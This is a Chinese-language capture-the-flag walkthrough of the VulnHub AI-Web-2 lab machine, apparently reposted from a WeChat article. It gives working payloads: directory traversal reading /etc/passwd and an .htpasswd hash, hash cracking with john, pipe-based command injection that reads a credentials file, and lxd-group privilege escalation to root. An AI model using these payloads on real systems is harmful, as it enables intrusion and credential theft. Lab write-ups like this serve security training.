# vulnhub之aiweb2的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745663&idx=1&sn=13cf2607ee91c8951586c7306e7d945f&chksm=87148a3fb06303299cc1c0a6292a111eb2cc27f04f45948c6d2fcd627fac09f7ea1e2876f4af&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745663&idx=1&sn=13cf2607ee91c8951586c7306e7d945f&chksm=87148a3fb06303299cc1c0a6292a111eb2cc27f04f45948c6d2fcd627fac09f7ea1e2876f4af&scene=27#wechat_redirect)

本周实践的是vulnhub的aiweb2镜像，下载地址，https://download.vulnhub.com/aiweb/AI-Web-2.0.7z，

还是先做个地址扫描，sudo netdiscover -r 192.168.137.0/24，  

![](../Images/008b96db8b3ab28d8e9c5d95bf985bcc.png)

再做个端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.156，

![](../Images/908055b61d1d7f0581916e9a1a149ba9.png)

看到http有个特殊的应用XuezhuLi，在网上搜XuezhuLi，能搜到github上的项目，https://github.com/XuezhuLi/FileSharing，

![](../Images/edcbf1dbd23101d0830fdd059f754a7c.png)

还能搜到有可利用的漏洞，

![](../Images/b27a65c2fdba29990e7021be9f4d918d.png)

访问https://www.exploit-db.com/exploits/40009，看到有目录穿越漏洞的利用方法，先得知道URL是啥，专项爆破一下，sudo dirb http://192.168.137.156 -X .php,.html,.txt,.zip，

![](../Images/e90e1b30d2f291897fd0556cbf758625.png)

这就可以试试读取密码文件了，http://192.168.137.156/download.php?file\_name=../../../../../../../../../../../../../etc/passwd，

passwd文件是能读到，但是shadow文件读不到，不能直接破解，

换个思路，读apache的htpasswd文件，http://192.168.137.156/download.php?file\_name=../../../../../../../../../../../../../etc/apache2/.htpasswd，

里面有aiweb2admin:$apr1$VXqmVvDD$otU1gx4nwCgsAOA7Wi.aU/，

这个可以直接破解，

sudo john --wordlist=/usr/share/wordlists/rockyou.txt htpwd.txt，

得到aiweb2admin的密码是c.ronaldo，

![](../Images/d8d1da46c2a51831054ed9a80ad32029.png)

但是这个用户名密码无法ssh，猜测可能是web后台的用户名密码，爆破一下web后台的URL，sudo dirb http://192.168.137.156，

![](../Images/e400a2de85e985fc07165a72b070008f.png)

登录web后台成功，

![](../Images/15d21e954d3c15b9a03e62291ffbc428.png)

按提示操作访问robots文件，

![](../Images/694be9fde0a5f24fe1ed09f8725a99bb.png)

继续按提示操作，访问第一个URL，

![](../Images/4de4a242b04898a13ea64459bad0fcc8.png)

再试试访问第二个URL，

![](../Images/d4b3650b08daedb46a88fda983032294.png)

根据提示猜测，第二个URL目录里有重要信息，而这个信息要通过第一个URL提供的途径获取，第一个URL里输入地址提交，发现能成功执行并返回结果，

![](../Images/99f9fff037fa4dd909b96050a970036d.png)

则猜测可以通过方法绕过执行单一命令的限制，相当于远程命令执行漏洞，

经过尝试，192.168.137.156|find . -type f /var/www/html/webadmin/S0mextras/，嗯，目录里还真有干货，

![](../Images/d52b36cef7a6ecac1b613f29ffd32516.png)

那就把它读出来，192.168.137.156|cat /var/www/html/webadmin/S0mextras/.sshUserCred55512.txt，

![](../Images/349fd1e127affd4427393f1a1f044259.png)

这就又拿到了一套用户名密码，

n0nr00tuser/zxowieoi4sdsadpEClDws1sf，

这个可以ssh登录，但是不支持sudo，

![](../Images/0ddfb3eef8c84e60970a0edc7012f2b6.png)

到此时尝试了很多种提权方法都搞不定，最后发现这个用户属于lxd组，则可以通过lxd的漏洞提权，searchsploit lxd，searchsploit -m 46978，

![](../Images/8992f5e478f5ee94f2dae79b292b91c5.png)

在kali上wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine，bash build-alpine，生成了alpine-v3.11-x86\_64-20200504\_0725.tar.gz，

把46978.sh和alpine-v3.11-x86\_64-20200504\_0725.tar.gz都搞到靶机里，

执行./46978.sh -f alpine-v3.11-x86\_64-20200504\_0725.tar.gz，

![](../Images/fa461c4f72a007baf73c9ffeeaf1a757.png)

至此拿root权限成功。
